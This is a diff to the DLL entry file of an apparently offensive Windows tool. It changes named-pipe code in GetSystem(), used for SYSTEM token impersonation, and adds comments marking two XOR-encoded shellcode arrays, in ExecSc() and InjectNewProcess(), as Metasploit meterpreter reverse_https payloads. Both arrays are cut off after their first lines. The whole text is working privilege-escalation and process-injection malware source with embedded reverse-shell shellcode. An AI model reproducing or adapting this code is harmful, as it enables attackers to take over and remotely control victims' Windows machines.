@@ -1,7 +1,6 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <sddl.h>
-#include <stdio.h>
 #include <stdlib.h>
 #include "token.h"
 
@@ -97,7 +96,7 @@ BOOL GetSystem() {
 	wsprintf(server, L"\\\\.\\pipe\\%s", pipename);
 	wsprintf(server2, L"\\\\localhost\\pipe\\%s", pipename);
 
-	hPipe = CreateNamedPipe(L"\\\\.\\pipe\\pipey",
+	hPipe = CreateNamedPipe(server,
 		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
 		PIPE_TYPE_BYTE |
 		PIPE_READMODE_BYTE |
@@ -109,7 +108,7 @@ BOOL GetSystem() {
 		NMPWAIT_USE_DEFAULT_WAIT,
 		NULL);
 
-	hPipe2 = CreateFile(L"\\\\localhost\\pipe\\pipey",
+	hPipe2 = CreateFile(server2,
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		NULL,
@@ -141,6 +140,7 @@ VOID ExecSc() {
 	//This is a backup method if other fails
 	//It will be executed if SYSTEM token is failed to be impersonated
 	//Change the shellcode in both methods
+	//payload/windows/x64/meterpreter/reverse_https -e x64/xor_dynamic
 	unsigned char shellcode[] =
 		"\xeb\x27\x5b\x53\x5f\xb0\x7c\xfc\xae\x75\xfd\x57\x59\x53\x5e"
 		"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xdb\xaf"
@@ -190,6 +190,7 @@ VOID ExecSc() {
 }
 
 DWORD InjectNewProcess(HANDLE hParent) {
+	//payload/windows/x64/meterpreter/reverse_https -e x64/xor_dynamic
 	unsigned char shellcode[] =
 		"\xeb\x27\x5b\x53\x5f\xb0\x84\xfc\xae\x75\xfd\x57\x59\x53\x5e"
 		"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x7d\x12"
